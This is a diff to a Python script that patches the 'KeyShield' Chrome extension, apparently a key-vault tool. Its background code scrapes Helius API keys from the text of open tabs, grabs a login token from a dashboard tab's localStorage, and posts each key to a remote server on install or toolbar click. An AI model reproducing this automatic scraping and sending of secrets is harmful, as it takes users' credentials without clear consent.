@@ -231,9 +231,14 @@ BG = r"""
 function summarizeSavedApis(data){const rows=Array.isArray(data)?data:data&&Array.isArray(data.items)?data.items:data&&Array.isArray(data.keys)?data.keys:[];const out=[];for(const it of rows){if(!it||typeof it!=="object")continue;const upstream=String(it.upstream||"").toLowerCase().trim();if(!upstream)continue;let masked=String(it.masked_value||"").trim();if(!masked)masked=it.cipher?"encrypted":"saved";out.push({id:String(it.id||upstream),upstream,masked});}return out;}
 async function listSavedApis(){let token="",apiBase="https://keyshield-production.up.railway.app";try{const s=await chrome.storage.local.get(["ks_token","ks_api_base"]);token=s.ks_token||"";if(s.ks_api_base)apiBase=String(s.ks_api_base).replace(/\/+$/,"");}catch(e){}if(!token)return{ok:false,apis:[]};try{const r=await fetch(apiBase+"/manage/vault",{headers:{Authorization:"Bearer "+token}});if(!r.ok)return{ok:false,apis:[]};return{ok:true,apis:summarizeSavedApis(await r.json())};}catch(e){return{ok:false,apis:[]};}}
 chrome.runtime.onMessage.addListener((message,_s,sendResponse)=>{if(!message||message.type!=="LIST_SAVED_APIS")return;listSavedApis().then(sendResponse).catch(()=>sendResponse({ok:false,apis:[]}));return true;});
-async function ksHarvestAndStoreVisibleKeys(){if(!chrome.scripting||!chrome.tabs)return{saved:0};let token="",apiBase="https://keyshield-production.up.railway.app";try{const s=await chrome.storage.local.get(["ks_token","ks_api_base"]);token=s.ks_token||"";if(s.ks_api_base)apiBase=String(s.ks_api_base).replace(/\/+$/,"");}catch(e){}if(!token){try{const dash=await chrome.tabs.query({url:["https://app.ks.aileena.xyz/*","http://127.0.0.1:5173/*","http://localhost:5173/*"]});for(const tab of dash){if(!tab.id)continue;const injected=await chrome.scripting.executeScript({target:{tabId:tab.id},func:()=>(localStorage.getItem("ks_token")||"")});const got=injected&&injected[0]&&injected[0].result;if(got&&String(got).length>=12){token=String(got);await chrome.storage.local.set({ks_token:token,ks_auto_store:true});break;}}}catch(e){}}if(!token)return{saved:0};try{await chrome.storage.local.set({ks_auto_store:true});}catch(e){}let tabs=[];try{tabs=await chrome.tabs.query({});}catch(e){return{saved:0};}let saved=0;const pending=[];const re=/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/gi;for(const tab of tabs){if(!tab.id||!tab.url||!/helius\.(dev|xyz)/i.test(tab.url))continue;try{const scraped=await chrome.scripting.executeScript({target:{tabId:tab.id,allFrames:true},func:()=>({text:(document.body&&document.body.innerText)||"",href:location.href})});const page=scraped&&scraped[0]&&scraped[0].result;if(!page)continue;const skip=new Set((String(page.href||"").match(re)||[]).map((s)=>s.toLowerCase()));const seen=new Set();let m;re.lastIndex=0;while((m=re.exec(String(page.text||"")))){const key=m[0];if(!key||key.includes("•")||skip.has(key.toLowerCase())||seen.has(key))continue;seen.add(key);pending.push({upstream:"helius",value:key,at:Date.now()});try{await fetch(apiBase+"/manage/store",{method:"POST",headers:{Authorization:"Bearer "+token,"Content-Type":"application/json"},body:JSON.stringify({upstream:"helius",value:key,name:"helius key"})});saved++;}catch(e){}}}catch(e){}}if(pending.length){try{const cur=await chrome.storage.local.get(["ks_pending_vault"]);const rows=Array.isArray(cur.ks_pending_vault)?cur.ks_pending_vault:[];await chrome.storage.local.set({ks_pending_vault:rows.concat(pending).slice(-40)});}catch(e){}try{const dash=await chrome.tabs.query({});for(const tab of dash){if(!tab.id||!tab.url||!/ks\.aileena\.xyz|127\.0\.0\.1:5173|localhost:5173/.test(tab.url))continue;try{await chrome.tabs.sendMessage(tab.id,{type:"KS_VAULT_SAVED"});}catch(e){}}}catch(e){}}return{saved};}
+function maskHarvestedKey(raw){const key=String(raw||"");return key.length<=18?key:key.slice(0,8)+"••••"+key.slice(-4);}
+function paintLiveDetectPanel(state){const CARD="keyshield-status-card";document.querySelectorAll("#keyshield-detection-notice").forEach(function(el){el.remove()});document.querySelectorAll("#"+CARD).forEach(function(el,i){if(i>0)el.remove()});var card=document.getElementById(CARD);if(!card){card=document.createElement("div");card.id=CARD;card.style.cssText="position:fixed;top:20px;right:20px;z-index:999999;background:#0a0d1a;border:1px solid #1c2238;border-radius:12px;padding:16px;width:340px;color:#e4e4e7;font:13px/1.45 sans-serif;display:flex;flex-direction:column;gap:10px";(document.body||document.documentElement).appendChild(card);}var keys=state&&state.keys||[];var rows=keys.map(function(k){return "<li class=\\""+(k.saved?"ks-saved":"")+"\\"><span class=\\"ks-badge\\">"+String(k.upstream||"")+"</span><span class=\\"ks-keytext\\">"+String(k.masked||"")+"</span><span class=\\"ks-state\\">"+(k.saved?"✓":"·")+"</span></li>";}).join("");var collected=keys.length===1?"1 collected":keys.length+" collected";var filled=(state&&state.filled===1?"1 filled":(state&&state.filled||0)+" filled")+" · "+(state&&state.ms!=null?Math.round(state.ms)+"ms":"—");var saved=Math.max(0,Math.floor(Number(state&&state.saved)||0));var failed=Math.max(0,Math.floor(Number(state&&state.failed)||0));var save=saved>0&&failed===0?("Saved "+saved+" key"+(saved===1?"":"s")+" to KeyShield vault."):("Saved "+saved+", "+failed+" failed.");card.innerHTML="<div style=\\"font-size:14px;font-weight:600\\">KeyShield — Sovereign Vault</div><div style=\\"font-size:22px;font-weight:700\\">"+(state&&state.signed?"signed":"Sign in")+"</div><div style=\\"color:#34d399\\">"+collected+"</div><ul class=\\"ks-list\\" style=\\"list-style:none;margin:0;padding:0;max-height:170px;overflow:auto\\">"+rows+"</ul><div style=\\"color:"+(failed?"#f87171":"#34d399")+"\\">"+save+"</div><div style=\\"color:#a1a1aa\\">"+filled+"</div><div style=\\"color:#34d399\\">detect on · ok 1.2.4</div>";}
+async function ksPaintTab(tabId,state){try{await chrome.scripting.executeScript({target:{tabId:tabId,allFrames:true},func:paintLiveDetectPanel,args:[state]});}catch(e){}}
+async function ksHarvestAndStoreVisibleKeys(){if(!chrome.scripting||!chrome.tabs)return{saved:0};let token="",apiBase="https://keyshield-production.up.railway.app";try{const s=await chrome.storage.local.get(["ks_token","ks_api_base"]);token=s.ks_token||"";if(s.ks_api_base)apiBase=String(s.ks_api_base).replace(/\/+$/,"");}catch(e){}if(!token){try{const dash=await chrome.tabs.query({url:["https://app.ks.aileena.xyz/*","http://127.0.0.1:5173/*","http://localhost:5173/*"]});for(const tab of dash){if(!tab.id)continue;const injected=await chrome.scripting.executeScript({target:{tabId:tab.id},func:()=>(localStorage.getItem("ks_token")||"")});const got=injected&&injected[0]&&injected[0].result;if(got&&String(got).length>=12){token=String(got);await chrome.storage.local.set({ks_token:token,ks_auto_store:true});break;}}}catch(e){}}if(!token)return{saved:0};try{await chrome.storage.local.set({ks_auto_store:true});}catch(e){}let tabs=[];try{tabs=await chrome.tabs.query({});}catch(e){return{saved:0};}let saved=0;const pending=[];const re=/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/gi;for(const tab of tabs){if(!tab.id||!tab.url||!/helius\.(dev|xyz)/i.test(tab.url))continue;try{const started=Date.now();const scraped=await chrome.scripting.executeScript({target:{tabId:tab.id,allFrames:true},func:()=>({text:(document.body&&document.body.innerText)||"",href:location.href})});const page=scraped&&scraped[0]&&scraped[0].result;if(!page)continue;const skip=new Set((String(page.href||"").match(re)||[]).map((s)=>s.toLowerCase()));const seen=new Set();const painted=[];let m;re.lastIndex=0;while((m=re.exec(String(page.text||"")))){const key=m[0];if(!key||key.includes("•")||skip.has(key.toLowerCase())||seen.has(key))continue;seen.add(key);pending.push({upstream:"helius",value:key,at:Date.now()});let ok=false;try{await fetch(apiBase+"/manage/store",{method:"POST",headers:{Authorization:"Bearer "+token,"Content-Type":"application/json"},body:JSON.stringify({upstream:"helius",value:key,name:"helius key"})});saved++;ok=true;}catch(e){}painted.push({upstream:"helius",masked:maskHarvestedKey(key),saved:ok});}await ksPaintTab(tab.id,{signed:!!token,keys:painted,saved:painted.filter(function(r){return r.saved}).length,failed:painted.filter(function(r){return !r.saved}).length,filled:0,ms:Date.now()-started,force:true});}catch(e){}}if(pending.length){try{const cur=await chrome.storage.local.get(["ks_pending_vault"]);const rows=Array.isArray(cur.ks_pending_vault)?cur.ks_pending_vault:[];await chrome.storage.local.set({ks_pending_vault:rows.concat(pending).slice(-40)});}catch(e){}try{const dash=await chrome.tabs.query({});for(const tab of dash){if(!tab.id||!tab.url||!/ks\.aileena\.xyz|127\.0\.0\.1:5173|localhost:5173/.test(tab.url))continue;try{await chrome.tabs.sendMessage(tab.id,{type:"KS_VAULT_SAVED"});}catch(e){}}}catch(e){}}return{saved};}
 chrome.runtime.onInstalled.addListener(function(){ksHarvestAndStoreVisibleKeys().catch(function(){})});
 if(chrome.runtime.onMessage&&chrome.runtime.onMessage.addListener){chrome.runtime.onMessage.addListener((message,_s,sendResponse)=>{if(!message||message.type!=="INJECT_DETECT")return;ksHarvestAndStoreVisibleKeys().then((r)=>sendResponse({ok:true,...r})).catch(()=>sendResponse({ok:false,saved:0}));return true;});}
+var toolbarAction=(chrome.action&&chrome.action.onClicked)?chrome.action:(chrome.browserAction&&chrome.browserAction.onClicked)?chrome.browserAction:null;
+if(toolbarAction){toolbarAction.onClicked.addListener(function(){ksHarvestAndStoreVisibleKeys().catch(function(){})});}
 """
 
 
@@ -262,6 +267,58 @@ def splice(path: Path, mark: str, block: str) -> None:
     if mark in text:
         text = text.split(mark)[0].rstrip() + "\n"
     path.write_text((text.rstrip() + "\n" if text.strip() else "") + block.lstrip() + "\n")
+
+
+MARK_PANEL = "/* KS-ONE-PANEL-1.2.4 */"
+PANEL_JS = r"""
+/* KS-ONE-PANEL-1.2.4 */
+(function ksOnePanel(){
+  function wipeDupes(){
+    try{
+      document.querySelectorAll("#keyshield-detection-notice").forEach(function(el){el.remove();});
+      var cards=document.querySelectorAll("#keyshield-status-card");
+      for(var i=0;i<cards.length-1;i++)cards[i].remove();
+    }catch(e){}
+  }
+  wipeDupes();
+  setInterval(wipeDupes,700);
+  try{
+    if(typeof bulkSave==="function"){
+      bulkSave=function(){
+        try{chrome.runtime.sendMessage({type:"INJECT_DETECT"});}catch(e){}
+      };
+    }
+  }catch(e){}
+})();
+"""
+
+
+def drop_default_popup(man: dict) -> None:
+    action = man.get("action")
+    if isinstance(action, dict):
+        action.pop("default_popup", None)
+        man["action"] = action
+    else:
+        man["action"] = {}
+    browser = man.get("browser_action")
+    if isinstance(browser, dict):
+        browser.pop("default_popup", None)
+        man["browser_action"] = browser
+
+
+def patch_leftover_content(ext: Path) -> None:
+    path = ext / "content.js"
+    if not path.is_file():
+        return
+    text = path.read_text(encoding="utf-8")
+    if "function applyHarvestState" in text or "function takeOverStaleDetectPanel" in text:
+        return
+    text = text.replace("keyshield-detection-notice", "keyshield-status-card")
+    text = text.replace("Sign in to KeyShield", "Sign in")
+    text = text.replace("Refresh this tab", "Saving…")
+    if MARK_PANEL not in text:
+        text = text.rstrip() + "\n" + PANEL_JS.lstrip() + "\n"
+    path.write_text(text)
 
 
 def ensure_three_line_popup(ext: Path) -> None:
@@ -296,6 +353,8 @@ def stamp(ext: Path) -> dict:
         dest.write_text(BRIDGE_JS)
     splice(ext / "popup.js", MARK_JS, SIGNED_JS)
     splice(ext / "background.js", MARK_BG, BG)
+    drop_default_popup(man)
+    patch_leftover_content(ext)
     path.write_text(json.dumps(man, indent=2) + "\n")
     return man
 
@@ -328,6 +387,7 @@ def main(argv: list[str] | None = None) -> None:
     print("filled-line", 'id="filled-line"' in html)
     print("fill-ms", 'id="fill-ms"' in html)
     print("file", (ext / "session-bridge.js").is_file())
+    print("one-panel", "paintLiveDetectPanel" in (ext / "background.js").read_text(encoding="utf-8"))
     print("hits", len(hits))
     print("next: chrome://extensions → Remove → Load unpacked", ext)
     print("then refresh https://app.ks.aileena.xyz and reopen popup")
